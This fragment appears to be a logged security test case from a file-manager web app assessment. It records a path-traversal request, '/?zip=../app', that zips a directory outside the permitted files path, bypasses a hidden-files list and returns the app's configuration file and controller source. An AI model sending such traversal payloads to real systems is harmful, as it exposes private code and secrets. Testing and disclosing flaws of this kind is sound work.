@@ -1,0 +1,5 @@
+=== [C3] GET /?zip=../app (zip dir outside files_path, app/** hidden-list bypass) ===
+HTTP_STATUS=200 SIZE=6803444 TYPE=application/zip
+     4898  2026-09-29 15:07   config_app.php
+     2235  2026-09-29 15:07   src_Controllers_FileController.php
+     3844  2026-09-29 15:07   src_Controllers_ZipController.php
